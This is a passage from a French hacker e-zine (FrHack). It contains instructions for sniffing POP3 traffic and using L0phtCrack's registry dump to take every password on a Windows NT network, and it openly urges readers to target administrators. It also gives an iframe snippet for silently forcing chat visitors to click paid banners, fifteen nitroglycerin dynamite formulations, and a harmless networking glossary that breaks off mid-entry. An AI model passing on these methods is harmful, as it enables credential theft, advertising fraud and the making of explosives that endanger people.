esperer qu'ils n'ont pas regresse... Le probleme de ce systeme est que 
l'on devra cracker quand meme les pass. En effet, NT transmet les 
passwords sur le reseau (de la station vers le serveur) mais ce con les 
transmets cryptes... Ceci dit c'est deja pas mal et ca peut etre 
extremement pratique!!!
	La deuxieme solution est si vous avez un serveur de mail de 
sniffer les echanges avec ce serveur. Le service POP3 de NT n'est pas 
securise et les pass sont transmis sans etre codes ;) et la on se marre 
reellement mouahahahah. Installez le sniffer entre le serveur NT et le 
serveur de mails... Et voilou. Pour cela je ne saurais trop vous 
conseiller le programme sniffit qui tourne sous Unix et qui est a mon 
avis Le meilleur sniffer existant. Testez le et vous verrez.
	Bien sur si l'admin n'est pas trop CON, vous n'aurez jamais sont 
pass meme en crypte (faut pas rever quand meme). Ceci dit les admins sot 
parfois tres cons! Le mien dont je ne siterais pas le nom, utilise 
frequement un compte avec les droits administrateurs... Mouahahahah, 
c'est malin de sa part (et surtout tres gentil ;)

	Attention ne revez pas, ce n'est pas fini. Car si vous voulez 
reellement le password Administrateur (petit defi perso), il vous faudra 
utiliser par exemple (encore une fois) L0phtcrack. ET OUI!!! Pour ce 
faire vous devrais, avec des droits admin normalement, modifier dans la 
base de registre une variable pour pouvoir par la suite recuperer tous 
les passwords de votre reseau. La cle est 
HKEY_CURRENT_USER\Software\LHI\L0phtCrack\AdminGroupName . Vous devrez 
mettre le login Administrator dans votre langue ( vue qu'on est 
francophones : Administrateur). Une fois que vous aurez fait cela vous 
pourrez dumper la base de registre. Pour cela une option est presente 
dans le menu tools :Dump password from registry.
Et la le miracle de Microsoft se revele a vous... La liste complete des 
passwords (a cracker bien sur mais ...). Au fait si votre version de NT 
est en Anglais pas besoin de sniffer!!! Heureusement que je vous le dit 
hein!!!

	Donc voila, je crois bien que j'ai fini. J'espere ne pas vous 
avoir trop fait chier en racontant toutes ces conneries et j'espere 
surtout que ca vous servira bien. Faites bien chier tous ces cons 
d'administrateurs NT... Je suis dispo a repondre a toutes vos questions. 
Sachez tout de meme que d'autres textes suivront sur NT si cela vous 
interresse.

	Le moment est venu de faire des greetings. Alors je commence (ca 
sera pas long) par Kthulu et BuBle qui m'ont aide et motive au debut, et 
surtout Utopiste qui m'a encore plus motive et qui a malheureusement 
disparue de la scene... Un grand salut donc a vous tous, ainsi qu'a 
Protek, Vatoo, et tous les anciens de Frhack dissemines un peu 
partout...


	FRANCOPHONES SOULEVEZ VOUS!!!!

Fedaikin	>>>>>>>>>>>>>	Fedaikin@altern.org
Collaborateur FrHack


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Slogan

/msg #hack.fr Bon tlm, dite quelques choses d'intelligent qui va paraitre dans le Emag.
<[ewoks]> l'homme qui a vu l'homme qui a vu l'ours qui mangeais l'homme
<ASHMEU> internet ca rentre tu su une diskette ?? ;) 
<PsYkAoS> Chien ... Assis! , Chien ... fait le beau! , Chien ... Donne la patte! , Chien ... soit pas 
gay!
<Undertake> yeahhh
<kthulu> n'est pas mort ce qui dans l'eau dort à jamais car au long des siecles peut mourrir 
même la Mort.
<kthulu> il est une chose pire que de ne pas avoir réussi, c'est de ne pas avoir essayer
<G0LdSteIn> LEUR SEUL CRIME C DES CURIEUX
<mbuf> Dans le but d'expliquer ce qui est, de toute facon, devenu chose commune chez les 
script kids.
<Mr0range> White man, Black man, Rip the system
<Mr0range> Bow DOwn Before Master-Blackdindon

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Iframe

Introduction

Vous avez sûrement entendu parler des banners qui paye pour les clicks reçu
(pay per click). Ce service peut vous rapporter de l'argent...même beaucoup!

Slick and outslag ou qqc de même....haha...de la pure merde...vous allez
comprendre plus tard...


? 1

Bon. Premièrement, vous devez vous trouver un sponsor. Je vous conseille
www.cyberthrill.com il vous donne .20$ US pour chaque click sur leur banner.
Un coup que vous vous êtes inscrit, passez … l'étape 2.

? 2

Maintenant...une fois votre inscription au site terminé‚ vous avez sûrement
reçu une adresse qui contient le CGI qui compte log et analyse la provenance
des clicks. Prenez en note cette adresse et passez … la prochaine étape.

? 3

Ensuite, vous devez trouver un bon HTML CHAT. Moi celui que j'utilise le plus
souvent c'est la Jazette (www.pignon.com). Allez dans le chat, et écrivez ce
petit code HTML:

------Cut here------
<center>
<iframe name="content_name" width="3" height=""
src="l'addresse du CGI">
FrHack 0wnZ Ya!</iframe>
</center>
------Cut here------

L'adresse du CGI c'est l'adresse que vous avez prit en note … l'étape 2.
Understand?!?! Si tu comprend pas, c peut-être que tu sais pas lire...tk...

Résultats:
Euhh..c koi sa donne? Sa fait que tout le monde qui sont dans le chat click
sur ta banner, mais ils ne le savent pas. Si c'est pas assez puissant à ton
goût, ben và lire le journal du Québec, section offre de services.

Explication

C facile … comprendre...quelques html chat empêche de faire des FRAME...
mais ils ont oubli‚ IFRAME! ;)

Outro

Admettons qu'il y ait 100 personnes dans le chat (ce qui est fréquent sur la
Jazette), et que votre banner vous rapporte .20$ par click, ben vous venez
de vous faire 20$ en même pas une seconde! Le seul problème c'est que vous
ne pouvez pas le faire une autre fois, car les provider de banner compte pas
une 2ieme fois le même IP...mais vous n'avez qu'a changer de html chat!

N'oubliez pas que ce code html peut aussi servir … d'autre CGI script tel que
les webcounters, votes, etc... A vous de découvrir ce que vous pouvez faire
d'autre avec ce démon!

N.B.: Dépêchez-vous de vous faire de l'argent parce que après la sortit de ce
texte les providers de banners vont sûrement essayer de patcher ce trou et
rendre ceci impossible...mais pour l'instant (et d'après moi pour encore
longtemps) sa marche très bien!

The FrHack Crew
Cub1c

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Dynamite

Dans l’article qui và suive je vais vous donnez quelques "recettes" pour 
faire de la dynamite. Faut que vous soyez extrêmement précis dans les sub
stance a mélanger. L'article qui suit ne s'adresse pas a des débutants, mais 
a des experts, parce que la manipulation de la nitro glycerine est très 
dangereuse. Une base en chimie serais aussi préférable. C'est pourquoi en
aucun cas je peu être tenu responsable de ce que vous ferez avec l'article
qui suit, elle n'est qu'a but instructif.


La vous aller remarquer qu'il faut de la Nitro Glycerine dans tous les 
recettes, et vous vous demander comment faire ca??? Mais moi je vous dis
que ca va aller dans un prochain article plus ou moins loin. Tant mieux si
vous êtes capable d'en avoir, ou  vous avez la recette pour en faire.

Je rappel, que la nitro glycerine doit être tenu sous une chambre sans statique,
et a une température de 17 Celcius à 22 Celcius, sinon ca va faire un 
beau ptit boom.

Ce qui est de comment mélanger ce qui suit, a moins que je me trompe, c'est
pas vraiment important, mais en cas d'erreur, je vous conseille de prendre
mon article comme une référence, et non un guide sur quoi vous baser (A part
le pourcentage d'ingrédient qui assurer d'être vrai).

Pas mal tout les ingrédient (Sauf la Nitro Glycérine) ce trouve un peu 
partout, ou vous pouvez le faire. Bon voici les recettes:

#    ingredients 	            Pourcentage
-----------------------------------------
#1   Nitro Glycerine   		   		 32
     Nitrate de Sodium          		 28
     Brin de Scie (ripe de bois)           10
     Oxalate ammonium    	             29
     Poudre Noir                           1


#2   Nitro Glycerine                        24
     Nitrate de Potasium                   9        
     Nitrate de Sodium                     56
     Brin de Scie (ripe de bois)           9
     Oxalate ammonium                      2


#3   Nitro Glycerine                       35.5
     Nitrate de Potassium                  44.5
     Brin de Scie (ripe de bois)           6
     Pourdre Noir                          2.5
     Vaseline                              5.5
     Charbon de Bois (poudre)              6


#4   Nitro Glycerine                       50
     Nitrate de sodium                     32.6
     Brin de Scie (ripe de bois)           17
     Oxalate ammonium                      .4


#5   Nitro Glycerine                       57
     Nitrate de Potassium                  19
     Brin de Scie (ripe de bois)           9
     Oxalate ammonium                      12
     Pourdre Noir                          3


#6   Nitro Glycerine                       26
     Brin de Scie (ripe de bois)           40
     Nitrate de Barium                     32
     Carbonate de Sodium                   2


#7   Nitro Glycerine                      44
     Brin de Scie (ripe de bois)          12
     Sulfate de Sodium                    44


#8   Nitro Glycerine                      24
     Nitrate de Potassium                 32.5
     Brin de Scie (ripe de bois)          33.5
     Oxalate ammonium                     10


#9   Nitro Glycerine                      26
     Nitrate de Potassium                 33
     Brin de Scie (ripe de bois)          41
 
#10  Nitro Glycerine                      15
     Nitrate de sodium                    62.9
     Brin de Scie (ripe de bois)          21.2
     Carbonade de Sodium                  .9

#11  Nitro Glycerine                      35
     Nitrate de sodium                    27
     Brin de Scie (ripe de bois)          10
     Oxalate ammonium                     1


#12  Nitro Glycerine                      32
     Nitrate de Potassium                 27
     Brin de Scie (ripe de bois)          10
     Oxalate ammonium                     30
     Pourdre Noir                         1


#13  Nitro Glycerine                      33
     Brin de Scie (ripe de bois)          10.3
     ammonium oxalate                     29
     Pourdre Noir                         .7
     Perchloride de potassium             27


#14  Nitro Glycerine                     40
     Nitrate de sodium                   45
     Brin de Scie (ripe de bois)         15


#15  Nitro Glycerine                     30
     Nitrate de sodium                   22.3
     Brin de Scie (ripe de bois)         40.5
     Chlorate de Potassium               7.2


Voilà c’est la fin. Je sais pas si vous le saviez, mais la dynamite c'est très 
puissant, donc faite attention.

The FrHack Crew
Anonyme

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Therme régulier d'Internet

En restant assis devant mon écran, neunoeuilles rivés sur #hack.fr et en buvant un Sprite© 
(chez certains c'est des Pepsi©), j'étais parfois (souvent) perdu dans les termes employés : UDP 
= ? (ok je sais ce que cela signifie en gros mais les lettres U.D.P., c'est quoi exactement ? ), 
ICMP = ? (ben la même chose que précédemment) .. etc etc etc.
Je pense pas que ca soit non plus très amusant pour une personne de niveau avancé, de 
répondre à la question : "Ça signifie quoi DNS ? ". #Hack.fr est un peut-être un canal d'aide, 
mais y'à des limites aussi.

C'est pourquoi, j'ai décidé de faire un glossaire pour répertorier le maximum de termes afin que 
les newbies newbies et les newbies avancés évitent de faire perdre du temps aux "experts" si je 
puis dire ainsi.

Questions, commentaires, BombMail, lettres piégées, Tueurs à gages, escorts (ça je vous 
donnerais ma vraie adresse par exemple), vous pouvez me rejoindre au e-mail : 
gabberman78@hotmail.com . merci et bonne lecture.


@ A @

* Accès commuté (switched access)  :
- Connexion au réseau qui peut être établie ou rompue à la demande. Les connexions "Dial-UP" 
en représentent la forme la plus simple. SLIP et PPP sont généralement lancés au travers d'un 
accès commuté.

* Archie :
- Système permettant de localiser des fichiers disponibles publiquement par FTP (cf FTP) 
anonyme.

*  ARPAnet :
- Réseau expérimental établi dans les années 1970. Il a permis de développer et tester les 
théories et les logiciels sur lesquels Internet s'appuie aujourd'hui. Il a disparu aujourd'hui au profit 
d'autres réseaux comme NSFnet.

* ASCII (American Standard Code for Information Interchange) :
- Un standard créé pour assurer la compatibilité entre divers types d'équipements de traitement 
de données. Le jeu de caractères ASCII standard contient 128 nombres décimaux (codage 7 
bits), de 0 à 127, correspondant aux lettres, nombres, marques de ponctuation et autres 
caractères spéciaux communs. Le jeu de caractères ASCII étendu contient également l28 
nombres, mais de 128 à 255, et il est utilisé par les caractères nationaux (nos caractères 
accentués), des caractères graphiques, mathématiques ou spéciaux.


@ B @

* B-ISDN (Broadband Integrated Services Digital Network) :
- C'est le réseau large bande du futur qui permettra de transporter tous les services numériques.

* Backbone :
- Réseau central à haute vitesse qui contacte des réseaux plus petits et indépendants.

* Bande de base :
- Transmission d'un signal de données dans sa bande de fréquence d'origine.

* Bande passante (Bandwidth en anglais) : 
- Quantité de données que peut véhiculer un canal de communication. Plus le débit est 
important, plus les données peuvent
être transmises rapidement. Exprimé en bps.

* BBS (Bulletin Board System) : 
- C'est un ordinateur, souvent un micro, installé pour recevoir des appels et offrir des services en 
ligne. Les BBS permettent à leurs usagers de s'échanger des messages et fichiers ou encore de 
lire les Bulletins en ligne. Ils offrent souvent d'autres services : bases de données, News et 
conférences, shopping, etc.

* Binaire (fichier) (Binary file):
- Fichier numérique qui n'est pas composé uniquement de texte (programmes, images, sons, 
fichiers compressés, etc.)

* Bit :
- Plus petite unité d'information pouvant être transmise. Une combinaison de bits peut indiquer 
un caractère alphabétique, un chiffre ou remplir d'autres fonctions parmi lesquelles la 
signalisation et la commutation.

* BOT (beginning-of-tape, marqueur de début de bande) :
- Le terme "bot" est couramment employé pour désigner des programmes qui écoutent et 
répondent à une conversation sur un canal IRC.

* BPS (Bits par seconde) :
- Mesure de la vitesse de transmission d'un modem.


@ C @

* Canal : 
- Voie de télécommunications (canal de transmission) d'une capacité spécifique (vitesse) entre 
deux emplacements sur un réseau.

* CCITT (The Consultative Committee for International Telephony and Telegraphy)
- Un comité consultatif international mis en place par les Nations unies. Ses membres 
comprennent les autorités des postes, télégraphes et téléphones, des organismes scientifiques 
et les compagnies privées.

* Cellule :
- Petit paquet de 53 octets comprenant 48 octets de données et 5 octets de supervision.

* Cern :
- Acronyme de Centre Européen de Recherche Nucléaire. Le concept du WWW a été développé 
par un de ses chercheurs. http://www.cern.ch/

* CGI :
- L'interface Common Gateway Interface (Interface Gateway commune) s'adresse aux 
programmeurs qui créent des applications ou des scripts exécutés secrètement sur un serveur 
web. Ces scripts peuvent générer du texte ou d'autres types de données à la volée, peut-être en 
réponse à une entrée de l'utilisateur ou à l'extraction d'informations d'une base de données. 

* Client :
- Logiciel d'application qui travaille pour votre compte de manière à accéder à un serveur offrant 
un service quelque part sur le réseau.

* Connexion :
- Voie de transmission point à point spécialisée ou commutée.

* Contrôle de flux :
- Processus de contrôle de la cadence des unités d'information.

* Cyber-médecin :
- Médecin se lançant à l'assaut du cyber-espace. (scusez je la trouvais drôle celle la... haehahe)

* Cyber-Sexe :
- Ben c'est comme Cyber-médecin, sauf que la...ben.. si vous jouer à ça..comment dire... ahh 
pis laisser faire ; )


@ D @

* Datagramme :
- Service offert par un réseau en mode sans connexion. Les paquets sont considérés comme 
indépendants les uns des autres et portent l'adresse complète du récepteur.

* Datagramme IP (IP Datagram) :
- Il s'agit de l'unité informative de base transitant en réseau Internet. Elle contient en plus des 
données les adresses de sources et destination nécessaires à la transmission de même que les 
bits de contrôle.

* Dial-up : 
- Connexion au réseau Internet par modem (par opposition aux connexions permanentes sur les 
lignes spécialisées).

* DNS (Domain Name System) ou (système de noms de domaine)
- C'est une base de données distribuée qui donne la correspondance des noms de machines 
(comme www.ecam.be) en adresses Internet (comme 194.78.22.130), et inversement. Le DNS 
évite notamment d'avoir à se souvenir de listes d'adresses Internet.

* Dorsale (Backbone) :
- Réseau de connexions à large bande entre commutateurs.


@ E @

* EIA (Electronics Industry Association) :
- Association américaine qui a défini les normes RS232C et RS422.

* ETCD :
- Equipement de Transmission de Circuit de Données.

* Ethernet :
- Réseau local utilisant la technique d'accès CSMA/CD (Carrier Sense Multiple Access/ Collision 
Detection).

* ETTD :
- Equipement Terminal de Traitement de Donnés Désigne tous les types de terminaux, y 
compris les ordinateurs.


@ F @

* FAQ (Frequently Asked Question(s) ) :
- En l'occurrence cela recouvre deux significations complémentaires : une question 
fréquemment posée, ou une liste récapitulative des questions et leurs réponses associées. De 
nombreux groupes de News de USENET, ainsi que quelques listes de discussion d'autres 
origines maintiennent et publient régulièrement ces listes de façon que les participants ne 
passent pas leur temps à répondre à des questions déjà traitées. 

* Fast Ethernet :
- Réseau Ethernet utilisant la technique CSMA/CD de base à 100 Mbit/s.

* FDDI (Fiber Distributed Data Interface) :
- Réseau local et métropolitain qui peut atteindre 100 kilomètres et qui utilise un double anneau 
contra-rotatif avec une méthode d'accès de type jeton temporisé.

* Finger :
- Protocole permettant de trouver des informations sur les utilisateurs de votre réseau hôte. 
Certains réseaux ne permettent pas d'utiliser ce protocole à partir d'un système externe et 
d'autres l'interdisent complètement.

* Firewall : 
- Un firewall est un logiciel de type garde barrière qui prémunit le serveur Internet contre 
d'éventuelles attaques de l'extérieur.

* Freeware :
- Logiciel gratuit, copiable à volonté mais dont l'auteur se réserve la propriété, le programme 
source n'étant pas modifiable.

* FTP (File Transfer Protocol) ou (protocole de transfert de fichiers)
- Définit la manière de transférer les fichiers d'un ordinateur à l'autre.

* Full duplex :
- Le terme full duplex signifie qu'une communication , s'effectue dans les deux sens 
(terminal/serveur et serveur/terminal) simultanément, à la même vitesse.


@ G @

* Gopher : 
- Ce terme est associé à tous les sites Internet spécialisés dans la recherche de documents par 
menus. Les serveurs Gopher ont en quelque sorte été les précurseurs des systèmes plus 
évolués que sont les serveurs Web. Depuis une page HTML, il est possible d'accéder à un site 
Gopher en continuant la consultation avec un simple client Web.

* GUI (Graphical User Interface)
- Interface utilisateur graphique.


@ H @

* Half duplex :
- Le terme Half duplex signifie qu'une communication fonctionne dans les deux sens, mais dans 
une seule direction à la fois.

* Hôte (Host) : 
- Il s'agit d'un ordinateur distant qui accueille l'appel d'une machine.

* HTML (HyperText Markup Language) :
- Langage de marquage des documents hypertextes . C'est le langage dans lequel sont décrits 
les documents du World Wide Web.

* HTTP (HyperText Transfert Protocol) :
- Protocole régissant le Web.

* Hypermédia :
- Combinaison des termes Hypertexte et Multimédia.

* Hypertexte :
- Concept de documents électroniques qui permet de faire résider au sein d'un seul et même 
fichier tant les données utiles aux individus que les informations de services qui seront utilisées 
par les logiciels de consultation. Les documents HTML sont des documents hypertextes.


@ I @

* IAB (Internet Architecture Board) :
- C'est le conseil qui élabore les réflexions sur l'Internet et prend les décisions sur les points 
importants comme sur les normes à appliquer.

* ICMP (Internet Control Message Protocol) :
- Il s'agit d'une extension du protocole d'Internet. Il permet la génération de messages d'erreurs, 
de paquets test et de messages informatifs relatifs au IP.

* Intranet : 
- Les mêmes concepts et les mêmes types de service que l'Internet mais appliqués à un certain 
nombre d'utilisateurs. L'accès restreint à un Intranet est le plus souvent réalisé par un identifiant, 
un mot de passe et parfois l'adresse IP des machines.

* IP (Internet Protocol) :
- Le protocole Internet de base définit le datagramme comme l'unité d'information transitant à 
travers l'Internet et fournit les bases protocolaires d'une connexion Internet. IP inclut le protocole 
ICMP. L'intégralité des protocoles nécessaires à l'Internet sont souvent associé à TCP/IP car 
TCP et IP sont les deux protocoles complémentaires fondamentaux de l'Internet.

* ISDN (Integrated Services Digital Network - Réseau numérique à intégration de services) voir 
RNIS.

* ISO (International Organization for Standardization) :
- Organisme international de standardisation regroupant les organismes similaires de 89 nations. 
L'ISO est en charge des standards qui régissent l'Internet actuellement.

* Isochrone :
- Mode de transmission de données dans lequel les instants d'émission et de réception de 
chaque bit, caractère ou bloc  information sont fixés à des instants précis.

* ISP (Internet Service Provider) :
- Prestataire d'accès Internet.


@ J @

* Java : 
- Langage de programmation orienté-objet développé par Sun apportant de nouvelles 
fonctionnalités aux services de L'Internet.


@ K @ 

Aucune définition disponible

@ L @

* LAN (Local Area Network) :
- Réseau qui est géographiquement limité à quelques kilomètres et qui correspond à la taille 
d'une entreprise.

* Ligne dédiée ou ligne spécialisée :
- Ligne de communication privée établie entre deux points. Ce type de ligne est généralement 
utilisé pour relier un réseau local d'importance moyenne à un fournisseur de services Internet.

* List-Serv :
- ListServ est un logiciel gratuit qui automatise la maintenance et la distribution de listes de 
diffusions de messages électroniques. Il existe des listes de diffusion concernant de nombreux 
sujets - certaines listes sont "ouvertes" (tout abonné à la liste peut envoyer un message à toute 
la liste, comme lors d'une conversation), et d'autres sont "fermées" (seules certains abonnés 
peuvent créer des messages, mais tous les abonnés peuvent les lire).

* Login : 
- Votre identifiant sur Internet. Il est en principe assorti d'un mot de passe.


@ M @

* MAN (Metropolitan Area Network) :
- Réseau qui a la taille d'une métropole et qui permet d'interconnecter des réseaux locaux 
jusqu'à une centaine de kilomètres.

* MIME (Multi Purpose Internet Mail Extensions) : 
- Système d'encodage le plus utilisé pour joindre des fichiers numériques aux courriers 
électroniques.

* Modèle de référence :
- Modèle permettant de décrire un service de télécommunication par un ensemble de sept 
couches fonctionnelles.

* Modem (MODulateur-DEModulateur) :
- Périphérique informatique connecté à un ordinateur et à une ligne téléphonique qui permet de 
transmettre des données numériques (informatiques) sur une ligne analogique (téléphonique). 
Lorsqu'on émet des données numériques sur la ligne, le modem MODule les données. Lorsqu'on 
reçoit des données analogiques sur un ordinateur, le modem DEModule.

* Multiplexeur :
- Équipement permettant de prendre en charge sur une voie haute vitesse, plusieurs voies basse 
vitesse simultanées.

* Multipoint :
- Connexion simultanée vers plusieurs points.


@ N @

* NCSA :
- Le National Center for Supercomputing Applications - Centre national des applications pour 
supercalculateur est un institut de formation. C'est là que le premier explorateur web (Mosaic) a 
été développé. http://www.ncsa.uiuc.edu/

* NETiquette :
- Ensemble de règles de bonne conduite inhérentes à la communication sur Internet.

* NFS (Network File System) :
- Système de fichiers orienté réseau. C est un ensemble de protocoles permettant d'utiliser des 
fichiers sur d'autres ordinateurs d'un réseau, comme si ces fichiers étaient locaux. Aussi, plutôt 
que d'utiliser FTP (v.) pour transférer un fichier sur votre ordinateur, peut on lire, écrire ou éditer 
un fichier distant. NFS a été développé par Sun Microsystems Inc. mais est actuellement 
disponible sur un grand nombre de machines.

* Nom de domaine : 
- Utilisé pour nommer un site Web. Exemple : le nom de domaine de Centre Hospitalier 
Universitaire de Rouen est chu-rouen suivi du suffixe fr pour France, qc pour Québec, ca pour 
Canada...

* NSCA (National Center for Supercomputing Applications) :
- Groupement à l'origine d'un grand nombre de logiciels clients du domaine public utilisés sur 
l'Internet.

* NSFnet :
- C'est le réseau de la National Science Foundation aux Etats-Unis. NSFnet n'est pas l'Internet, 
c'est juste l'une de ses très nombreuses composantes, même s'il y joue un rôle actif.

* NTP (Network Time Protocol) :
- C'est un protocole utilisé pour synchroniser le temps entre différents ordinateurs de l'Internet.


@ O @

* OSI (Open System Interconnection) :
- Système Ouvert d'Interconnexion, qui correspond à un ensemble de protocoles réseaux.


@ P @

* Passerelle :
- Convertisseur de protocole. Nœud spécifique à l'application qui connecte des réseaux qui 
seraient autrement incompatibles.
Convertit des codes de données et des protocoles de transmission pour permettre 
l'interfonctionnement.

* Ping (Packet Internet Gropher) :
- Programme utilisé en Internet pour tester l'accessibilité d'un destinataire en lui envoyant un 
message ICMP (cf ICMP) et en attendant la réponse avant de procéder à l'envoi des données. 
Le terme est souvent utilisé de manière générale pour représenter l'accessibilité d'un 
destinataire." please ping host A to see if it is alive".

* Plésiochrone :
- Deux signaux sont dits plésiochrones lorsque leurs instants significatifs se présentent à la 
même cadence nominale, toute variation de cette cadence étant maintenue dans des limites 
spécifiées. (tin, dit ça dans un chan, pis tu deviens OP.. haheahe c'est une joke la.. quoique ;)

* Pointeur :
- Adresse (URL) incorporée dans des données et indiquant l'emplacement de données dans un 
autre enregistrement ou fichier. Un hyperlien est un exemple de pointeur.

* Pont :
- Passerelle d'interconnexion entre deux réseaux locaux qui commute sur des adresses MAC.

* POP (point of presence - point de présence) :
- Un "pop" est la connexion commutée d'un prestataire de services Internet (ISP) pour les 
utilisateurs de modem. Il est particulièrement utilisé pour décrire des connexions locales afin que 
les utilisateurs de modem n'aient pas à composer un numéro longue distance. Ainsi, un ISP 
spécifique peut être basé à San José mais avoir des "POP" à Los Angeles et New York.

* POP 3 : (Post Office Protocol version 3) : 
- Protocole utilisé pour le courrier électronique.

* PPP (Point to Point Protocol) :
C'est un protocole qui permet à un ordinateur d'utiliser les protocoles TCP IP, et de devenir ainsi 
un membre de l'Internet à part entière, en utilisant une simple ligne téléphonique associée à un 
modem rapide. PPP est un nouveau standard, qui remplace SLIP. Il est aujourd'hui supporté par 
tous les fournisseurs d'accès Internet.

* Protocole :
- Ensemble de règles destinées à réaliser une communication.

* Proxy : 
- Programme qui tourne sur un pont ou une passerelle et qui bloque le passage direct des 
paquets entre le client et le serveur et n'autorise le passage que de certains paquets.

* PSTN :
- Acronyme de "Public Switched Telephon Network", c'est à dire le réseau téléphonique 
classique, encore appelé réseau téléphonique commuté (RTC).


@ Q @

Aucune définition disponible 

@ R @

* Réflecteur de messages (malt reflector) :
- Adresse électronique particulière ; un courrier adressé à cette adresse est automatiquement 
redirigé vers une liste d'adresses. Fonction typiquement utilisée dans le cas d'une discussion 
groupée où les échanges sont effectués par la
messagerie.

* Relais de trame (Frame Relay) :
- Technologie de transfert de données utilisée parfois pour des vitesses importantes (64Kb - 
1,5Mb) dans les connexions Internet. Son utilisation est surtout le fait des opérateurs plus que 
des utilisateurs individuels.

* Répéteur :
- Equipement placé sur une liaison, permettant d'amplifier ou de régénérer les signaux transmis.

* Réseau :
- Ensemble d'ordinateurs connectés par une liaison spécialisée ou commutée pour assurer une 
communication locale ou distante (de voix, vidéos, données, etc.) et faciliter l'échange 
d'informations entre des utilisateurs ayant des intérêts communs.

* RNIS (Réseau Numérique à Intégration de Services) :
- Réseau dont le but est d'intégrer au départ la voix téléphonique et les données (bande étroite), 
et d'y ajouter des applications multimédias, voix, données, image (large bande). Il permet 
actuellement une connexion à l'Internet à 64Kb.

* Routage :
- Détermination du chemin emprunté dans un réseau par une communication ou un paquet de 
données.

* Route :
- En général la route est le chemin emprunté par le traffic réseau pour aller de sa source à la 
destination. En Internet, chaque datagramme. IP est routé séparément et peu donc emprunter 
des chemins physiques extrêmement variables. Les datagrammes sont corrigés et réassemblés 
à l'arrivée pour délivrer l'information.

* Routeur :
- Passerelle d'interconnexion entre deux réseaux qui commute sur une adresse de niveau 
réseau.


@ S @

* Serveur : 
- Ordinateur consultable par un autre ordinateur à l'aide d'un logiciel client.

* SGML :
- Le langage SGML (Standard Generalized Markup Language) permet de décrire d'autres 
langages structurés de description de documents. Par exemple, le langage HTML est défini à 
l'aide du langage SGML.

* Shareware :
- Les sharewares sont des logiciels qui sont distribués en versions intégralement fonctionnelles 
sur les réseaux de communication numériques. On peut les utiliser gratuitement pendant une 
dizaine de jours mais, au-delà de cette période d'essai, il faut acquitter le montant de la licence 
d'exploitation pour se mettre en règle.

* SLIP :
- Acronyme de "Serial Line IP", c'est à dire IP sur ligne série. C'est un protocole qui permet à un 
ordinateur d'utiliser les protocoles Internet, à partir d'une ligne téléphonique et d'un modem. SLIP 
est dépassé par PPP plus puissant et complet,                    mais est toujours utilisé, surtout dans 
le monde des PC.

* SMTP : 
- Simple Mail Transfer Protocol, le protocole qui, en un réseau TCP/IP, décrit le transit du 
courrier électronique entre l'ordinateur hôte et les utilisateurs. Port : 25.

* SSL :
- La Secure Socket Layer est un protocole garantissant la sécurité des communications de 
données par cryptage et décryptage des données échangées. 
http://home.netscape.com/newsref/pr/newsrelease17.htm/


@ T @

* Taux d'erreur résiduel :
- Rapport du nombre des bits, caractères ou blocs incorrectement reçus mais non détectés ou 
non corrigés, sur le nombre total de bits, caractères ou blocs émis.

* TCP (Transmission Control Protocol) :
- Le protocole standart Internet de niveau transport qui fournit un service fiable, en full duplex de 
transmission de données. Beaucoup d'applications réseau sont basées sur ce protocole qui 
associé au protocole IP représente la partie fondamentale des protocoles Internet. TCP établit 
des connexions orientées dans le sens où les participants à un échange de données                     
doivent auparavant établir une connexion. En général les logiciels utilisant TCP sont installés au 
niveau système d'exploitation et utilise IP pour transmettre des données sur Internet.

* Token-Ring :
- Réseau local utilisant une technique d'accès de type jeton non adressé sur une boucle.

* Trame :
- Bloc de données dans un protocole de liaison. Ensemble d'intervalles de temps consécutifs 
alloués à des sous-voies dans un multiplexage temporel.

* Transmission asynchrone : 
- Communication série entre deux ordinateurs dont les signaux sont émis à intervalles 
irréguliers. Les données sont transmises précédées d'un bit de début (start bit) et d'un bit de fin 
(stop bit). Une communication asynchrone permet à un caractère d'être envoyé au hasard sans 
timing précis. En cas de nuisance sur la ligne, le modem pourra ainsi déterminer des moments 
favorables.

* Transmission synchrone :
- Mode de transmission dans lequel l'émetteur et 1e récepteur sont synchronisés par un signal 
d'horloge. Les événements sont programmés selon des durées fixes et les accusés de réception 
ne sont pas nécessaires pour pouvoir les compléter.

* Telnet :
- Telnet est un programme réseau qui permet d'ouvrir une session et de travailler sur un 
ordinateur à partir d'un autre ordinateur. En ouvrant une session sur un autre système, les 
utilisateurs peuvent accéder aux services Internet dont ils ne disposent pas sur leurs propres 
ordinateurs.

* Temps réel :
- Transmission et traitement rapides de données et opérations orientées événement au moment 
où elles se produisent, par                       opposition à leur stockage, retransmission ou 
traitement en lots.

* Transporteur :
- Prestataire de services de télécommunications possédant un équipement de commutation de 
réseau.


@ U @

* UDP (User Datagram Protocol) :
- Un protocole de paquet-niveau établi directement sur la couche de Internet Protocol. UPD 
utilise des programmes d'application-à-application entre les systèmes hôtes.

* URL (Uniform Ressource Locator) :
- Il s'agit d'un pointeur vers une source d'information sur le réseau. L'URL est apparu avec le 
Web qui se proposait d'unifier la plupart des services existant. Il fallait donc un systeme unique 
de pointeur pour référencer des services de nature et finalité différentes.

* Unix : 
- Système d'exploitation utilisé sur de très nombreux serveurs. La référence encore aujourd'hui 
sur le Net pour les serveurs.

* Usenet (USEr NETwork - Réseau utilisateur) :
- Groupes de discussion thématiques ("Newsgroups") sur Internet. Une des formes les plus 
récentes de courrier électronique de groupe. On dénombre actuellement environ 10 000 
newsgroups différents.


@ V @

* VRML - Virtual Reality Modeling Language - Langage VRML :
- Langage qui permet aux pages Web d'afficher des graphiques tridimensionnels et de proposer 
un mode de navigation spacial interactif.

* Veronica : 
- C'est un service, très similaire à Archie , qui est construit autour de Gopher. Tout comme 
Archie permet de chercher des sites FTP possédant un fichier donné, Veronica permet de faire 
de même en indiquant les sites Gopher offrant une entrée
particulière recherchée. (voir aussi Escort..ben quoi.. Veronica, belle brune, 5p10, 110 lbs... 
yummy ;)


@ W @

* Wais :
- Acronyme de "Wide Area Information Server". Il s'agit d'une méthode de recherche de 
documents qui s'appuie sur la mise en place de serveurs spécialisés abritant de gigantesques 
